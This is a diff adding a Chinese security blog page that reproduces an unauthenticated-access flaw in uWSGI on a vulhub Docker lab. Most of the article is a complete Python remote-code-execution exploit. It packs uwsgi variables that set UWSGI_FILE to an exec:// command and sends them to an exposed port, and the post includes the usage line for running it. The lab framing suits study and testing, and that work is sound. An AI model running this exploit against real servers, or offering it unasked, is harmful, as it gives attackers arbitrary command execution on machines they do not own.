@@ -1,0 +1,365 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>She11c0de&#39;s blogs</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="uWSGI 未授权访问漏洞一、漏洞简介WSGI是一款Web应用程序服务器，它实现了WSGI、uwsgi和http等协议，并支持通过插件来运行各种语言，通常被用于运行PythonWEB应用。uwsgi除了是应用容器的名称之外，它和Fastcgi之类的一样，也是前端server与后端应用容器之间的一个交流标准。目前nginx，apache也支持uwsgi协议进行代理转发请求。 uWSGI支持通过魔术变">
+<meta property="og:type" content="article">
+<meta property="og:title" content="She11c0de&#39;s blogs">
+<meta property="og:url" content="https://she11c0de.github.io/2022/07/07/uWSGI/uWSGI%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/index.html">
+<meta property="og:site_name" content="She11c0de&#39;s blogs">
+<meta property="og:description" content="uWSGI 未授权访问漏洞一、漏洞简介WSGI是一款Web应用程序服务器，它实现了WSGI、uwsgi和http等协议，并支持通过插件来运行各种语言，通常被用于运行PythonWEB应用。uwsgi除了是应用容器的名称之外，它和Fastcgi之类的一样，也是前端server与后端应用容器之间的一个交流标准。目前nginx，apache也支持uwsgi协议进行代理转发请求。 uWSGI支持通过魔术变">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://she11c0de.github.io/resource/uWSGI%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/media/rId24.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/uWSGI%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/media/rId25.png">
+<meta property="article:published_time" content="2022-07-08T06:26:06.421Z">
+<meta property="article:modified_time" content="2022-07-08T07:24:51.402Z">
+<meta property="article:author" content="She11c0de">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://she11c0de.github.io/resource/uWSGI%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/media/rId24.png">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  <link type="text/css" href="//netdna.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+<link rel="stylesheet" href="/css/scrollUp/image.css">
+
+  <!--[if lt IE 9]><script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7/html5shiv.min.js"></script><![endif]-->
+  
+<meta name="generator" content="Hexo 5.4.2"></head>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <div class="logo">
+        <img src="/logo.png" alt="Profile Picture">
+      </div>
+      <div id="title">She11c0de's blogs</div>
+      
+       <ul class="my-socials">
+  
+ 
+</ul>
+    </div>
+  </div>
+  <div id="header-inner" class="">
+    <nav id="main-nav">
+      <a id="main-nav-toggle" class="nav-icon"></a>
+      <!--
+        
+          
+            <a class="main-nav-link" href="/">首页</a>
+          
+            <a class="main-nav-link" href="/categories/life">生活</a>
+          
+            <a class="main-nav-link" href="/archives">归档</a>
+          
+        
+      -->
+    </nav>
+    <nav id="title-nav" style="display:none">
+      <a href="/">She11c0de&#39;s blogs</a>
+      <img src="/logo.png" alt="Profile Picture">
+      <!--
+      <span id="title-nav-socials">
+        
+       
+     </span>
+      -->
+    </nav>
+    <nav id="sub-nav">
+      
+      <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+    </nav>
+    <div id="search-form-wrap">
+      <form action="http://www.baidu.com/baidu" method="get" accept-charset="utf-8" class="search-form">
+        <input type="search" name="word" maxlength="20" class="search-form-input" placeholder="搜索">
+        <input type="submit" value="" class="search-form-submit">
+        <input name=tn type=hidden value="bds">
+        <input name=cl type=hidden value="3">
+        <input name=ct type=hidden value="2097152">
+        <input type="hidden" name="si" value="she11c0de.github.io">
+      </form>
+    </div>
+  </div>
+  <div class="site-nav" style="display: none;">
+    <ul>
+      
+      
+        <li><a href="/">首页</a></li>
+      
+        <li><a href="/categories/life">生活</a></li>
+      
+        <li><a href="/archives">归档</a></li>
+      
+      
+    </ul>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-uWSGI/uWSGI 未授权访问漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/uWSGI/uWSGI%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-07-08T06:26:06.421Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="uWSGI-未授权访问漏洞"><a href="#uWSGI-未授权访问漏洞" class="headerlink" title="uWSGI 未授权访问漏洞"></a>uWSGI 未授权访问漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>WSGI是一款Web应用程序服务器，它实现了WSGI、uwsgi和http等协议，并支持通过插件来运行各种语言，通常被用于运行Python<br>WEB应用。uwsgi除了是应用容器的名称之外，它和Fastcgi之类的一样，也是前端server与后端应用容器之间的一个交流标准。目前nginx，apache也支持uwsgi协议进行代理转发请求。</p>
+<p>uWSGI支持通过魔术变量（Magic<br>Variables）的方式动态配置后端Web应用。如果其端口暴露在外，攻击者可以构造uwsgi数据包，并指定魔术变量<code>UWSGI_FILE</code>，运用<code>exec://</code>协议执行任意命令。</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>使用poc.py，执行命令<code>python poc.py -u your-ip:8000 -c &quot;touch /tmp/success&quot;</code>：</p>
+<p><img src="/resource/uWSGI%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/media/rId24.png" alt="1.png"></p>
+<p>执行<code>docker-compose exec web bash</code>进入容器，可见<code>/tmp/success</code>已经成功执行：</p>
+<p><img src="/resource/uWSGI%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/media/rId25.png" alt="2.png"></p>
+<pre><code>poc.py
+#!/usr/bin/python
+# coding: utf-8
+######################
+# Uwsgi RCE Exploit
+######################
+# Author: wofeiwo@80sec.com
+# Created: 2017-7-18
+# Last modified: 2018-1-30
+# Note: Just for research purpose
+
+import sys
+import socket
+import argparse
+import requests
+
+def sz(x):
+    s = hex(x if isinstance(x, int) else len(x))[2:].rjust(4, &#39;0&#39;)
+    s = bytes.fromhex(s) if sys.version_info[0] == 3 else s.decode(&#39;hex&#39;)
+    return s[::-1]
+
+
+def pack_uwsgi_vars(var):
+    pk = b&#39;&#39;
+    for k, v in var.items() if hasattr(var, &#39;items&#39;) else var:
+        pk += sz(k) + k.encode(&#39;utf8&#39;) + sz(v) + v.encode(&#39;utf8&#39;)
+    result = b&#39;\x00&#39; + sz(pk) + b&#39;\x00&#39; + pk
+    return result
+
+
+def parse_addr(addr, default_port=None):
+    port = default_port
+    if isinstance(addr, str):
+        if addr.isdigit():
+            addr, port = &#39;&#39;, addr
+        elif &#39;:&#39; in addr:
+            addr, _, port = addr.partition(&#39;:&#39;)
+    elif isinstance(addr, (list, tuple, set)):
+        addr, port = addr
+    port = int(port) if port else port
+    return (addr or &#39;127.0.0.1&#39;, port)
+
+
+def get_host_from_url(url):
+    if &#39;//&#39; in url:
+        url = url.split(&#39;//&#39;, 1)[1]
+    host, _, url = url.partition(&#39;/&#39;)
+    return (host, &#39;/&#39; + url)
+
+
+def fetch_data(uri, payload=None, body=None):
+    if &#39;http&#39; not in uri:
+        uri = &#39;http://&#39; + uri
+    s = requests.Session()
+    # s.headers[&#39;UWSGI_FILE&#39;] = payload
+    if body:
+        import urlparse
+        body_d = dict(urlparse.parse_qsl(urlparse.urlsplit(body).path))
+        d = s.post(uri, data=body_d)
+    else:
+        d = s.get(uri)
+
+    return &#123;
+        &#39;code&#39;: d.status_code,
+        &#39;text&#39;: d.text,
+        &#39;header&#39;: d.headers
+    &#125;
+
+
+def ask_uwsgi(addr_and_port, mode, var, body=&#39;&#39;):
+    if mode == &#39;tcp&#39;:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect(parse_addr(addr_and_port))
+    elif mode == &#39;unix&#39;:
+        s = socket.socket(socket.AF_UNIX)
+        s.connect(addr_and_port)
+    s.send(pack_uwsgi_vars(var) + body.encode(&#39;utf8&#39;))
+    response = []
+    # Actually we dont need the response, it will block if we run any commands.
+    # So I comment all the receiving stuff. 
+    # while 1:
+    #     data = s.recv(4096)
+    #     if not data:
+    #         break
+    #     response.append(data)
+    s.close()
+    return b&#39;&#39;.join(response).decode(&#39;utf8&#39;)
+
+
+def curl(mode, addr_and_port, payload, target_url):
+    host, uri = get_host_from_url(target_url)
+    path, _, qs = uri.partition(&#39;?&#39;)
+    if mode == &#39;http&#39;:
+        return fetch_data(addr_and_port+uri, payload)
+    elif mode == &#39;tcp&#39;:
+        host = host or parse_addr(addr_and_port)[0]
+    else:
+        host = addr_and_port
+    var = &#123;
+        &#39;SERVER_PROTOCOL&#39;: &#39;HTTP/1.1&#39;,
+        &#39;REQUEST_METHOD&#39;: &#39;GET&#39;,
+        &#39;PATH_INFO&#39;: path,
+        &#39;REQUEST_URI&#39;: uri,
+        &#39;QUERY_STRING&#39;: qs,
+        &#39;SERVER_NAME&#39;: host,
+        &#39;HTTP_HOST&#39;: host,
+        &#39;UWSGI_FILE&#39;: payload,
+        &#39;SCRIPT_NAME&#39;: target_url
+    &#125;
+    return ask_uwsgi(addr_and_port, mode, var)
+
+
+def main(*args):
+    desc = &quot;&quot;&quot;
+    This is a uwsgi client &amp; RCE exploit.
+    Last modifid at 2018-01-30 by wofeiwo@80sec.com
+    &quot;&quot;&quot;
+    elog = &quot;Example：uwsgi_exp.py -u 1.2.3.4:5000 -c \&quot;echo 111&gt;/tmp/abc\&quot;&quot;
+    
+    parser = argparse.ArgumentParser(description=desc, epilog=elog)
+
+    parser.add_argument(&#39;-m&#39;, &#39;--mode&#39;, nargs=&#39;?&#39;, default=&#39;tcp&#39;,
+                        help=&#39;Uwsgi mode: 1. http 2. tcp 3. unix. The default is tcp.&#39;,
+                        dest=&#39;mode&#39;, choices=[&#39;http&#39;, &#39;tcp&#39;, &#39;unix&#39;])
+
+    parser.add_argument(&#39;-u&#39;, &#39;--uwsgi&#39;, nargs=&#39;?&#39;, required=True,
+                        help=&#39;Uwsgi server: 1.2.3.4:5000 or /tmp/uwsgi.sock&#39;,
+                        dest=&#39;uwsgi_addr&#39;)
+
+    parser.add_argument(&#39;-c&#39;, &#39;--command&#39;, nargs=&#39;?&#39;, required=True,
+                        help=&#39;Command: The exploit command you want to execute, must have this.&#39;,
+                        dest=&#39;command&#39;)
+
+    if len(sys.argv) &lt; 2:
+        parser.print_help()
+        return
+    args = parser.parse_args()
+    if args.mode.lower() == &quot;http&quot;:
+        print(&quot;[-]Currently only tcp/unix method is supported in RCE exploit.&quot;)
+        return
+    payload = &#39;exec://&#39; + args.command + &quot;; echo test&quot; # must have someting in output or the uWSGI crashs.
+    print(&quot;[*]Sending payload.&quot;)
+    print(curl(args.mode.lower(), args.uwsgi_addr, payload, &#39;/testapp&#39;))
+
+if __name__ == &#39;__main__&#39;:
+    main()
+</code></pre>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><blockquote>
+<p><a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub/blob/master/uwsgi/unacc/README.zh-cn.md">https://github.com/vulhub/vulhub/blob/master/uwsgi/unacc/README.zh-cn.md</a></p>
+</blockquote>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/uWSGI/uWSGI%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qxjb00kdy8v13tta1k3i" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2022/07/07/uWSGI/%EF%BC%88CVE-2018-7490%EF%BC%89uWSGI%20PHP%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A%E6%BC%8F%E6%B4%9E/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          (no title)
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2022/07/07/UsualToolcms/UsualToolCMS-8.0%20a_templetex.php%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title"></div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2022 She11c0de<br>
+      Theme <a href="https://github.com/henryhuang/oishi" target="_blank">Oishi</a>, Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <!--
+      <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">首页</a>
+  
+    <a href="/categories/life" class="mobile-nav-link">生活</a>
+  
+    <a href="/archives" class="mobile-nav-link">归档</a>
+  
+</nav>
+    -->
+    
+
+<!-- 百度分享 start -->
+
+<!-- 百度分享 end -->
+
+<script src="//cdn.bootcss.com/jquery/1.11.1/jquery.min.js"></script>
+
+
+
+
+<script src="/js/jquery.scrollUp.min.js"></script>
+
+
+<script src="/js/jquery.transform.js"></script>
+
+
+<script src="/js/menu.js"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+<script src="/js/scrollUp.js"></script>
+
+
+  </div>
+</body>
+</html>
